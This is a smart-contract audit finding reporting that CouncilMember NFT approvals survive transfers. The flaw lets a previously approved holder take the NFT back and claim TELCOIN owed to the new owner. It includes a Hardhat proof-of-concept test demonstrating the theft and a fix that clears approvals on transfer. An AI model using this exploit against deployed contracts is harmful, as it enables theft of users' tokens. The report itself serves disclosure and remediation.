# Approvals are not cleared upon CouncilMember NFT transfers, allowing malicious holder to steal undue TELCOIN tokens

## Summary

The `CouncilMember` token utilizes custom approval logic that allows the owner of `GOVERNANCE_COUNCIL_ROLE` to approve users to spend specific tokens. These approvals are not cleared when the tokens are spent, which allows malicious user to reclaim previously spent tokens and steal the `TELCOIN` balance of new token owners.

## Vulnerability Detail

The `CouncilMember.sol` contract implements custom approval logic in place of the methods inherited from OpenZeppelin's contracts. This implementation consist of a storage mapping `_tokenApproval` and a corresponding `approve()` method:

```javascript
function approve(
        address to,
        uint256 tokenId
    )
        public
        override(ERC721Upgradeable, IERC721)
        onlyRole(GOVERNANCE_COUNCIL_ROLE)
    {
        _tokenApproval[tokenId] = to;
        emit Approval(ERC721Upgradeable.ownerOf(tokenId), to, tokenId);
    }
```

The contract overrides OpenZeppelin's `_isAuthorized()` method with custom implementation that checks if the `msg.sender` has the `GOVERNANCE_COUNCIL_ROLE` or is authorized for spending the specified token ID. The aforementioned `_tokenApproval` mapping is used for the latter.

```javascript
function _isAuthorized(
        address,
        address spender,
        uint256 tokenId
    ) internal view override returns (bool) {
        return (hasRole(GOVERNANCE_COUNCIL_ROLE, spender) ||
            _tokenApproval[tokenId] == spender);
    }
```

The issue is the approvals in `_tokenApproval` mapping are not cleared upon token transfers. This is in contradiction with ERC721 specification and allows for the following scenario:

1.  Admin (`GOVERNANCE_COUNCIL_ROLE`) approves Alice for spending her NFT.
2.  Alice sends the NFT to Bob.
3.  Some amount of `TELCOIN` tokens has been retrieved from Sablier stream and distributed between token holders. Bob has the right to claim portion of it as a rightful owner of a NFT.
4.  Alice notices this and transfers the NFT back to herself, utilizing the approval which has not been cleared.
5.  Now Alice can claim the `TELCOINs` rightfully belonging to Bob

The POC for the issue is provided below. Please paste it into `CouncilMember.test.ts` test suite.

```javascript
describe("POC", () => {
            it.only("Approved NFT spender can re-claim NFT", async () => {
                await telcoin.transfer(await stream.getAddress(), 100000);
                /* 1. Mint NFT to member */
                await expect(councilMember.mint(member.address)).to.not.reverted;
                /* 2. Admin approves member to spend their NFT */
                await councilMember.approve(member.address, 0);                
                expect(await councilMember.ownerOf(0)).to.equal(member.address);
                /* 3. Member sends the NFT to support */
                await councilMember.connect(member).transferFrom(member.address, support.address, 0);                
                expect(await councilMember.ownerOf(0)).to.equal(support.address);
                /* 4. The approval was not cleared - member can reclaim NFT and steal the balance */
                await councilMember.connect(member).transferFrom(support.address, member.address, 0);                
                expect(await councilMember.ownerOf(0)).to.equal(member.address);
                await expect(councilMember.connect(member).claim(0, 100)).to.not.reverted;
            });            
 })

```

## Impact

High, as the tokens are directly at risk.

## Tool used

Manual Review

## Recommendation

Clear the approvals on transfer. Add the following method to `CouncilMember.sol` contract:

```diff
+ function transferFrom(address from, address to, uint256 tokenId) public override(ERC721Upgradeable, IERC721) {
+       super.transferFrom(from, to, tokenId);
+	delete _tokenApproval[tokenId];
+ }
```
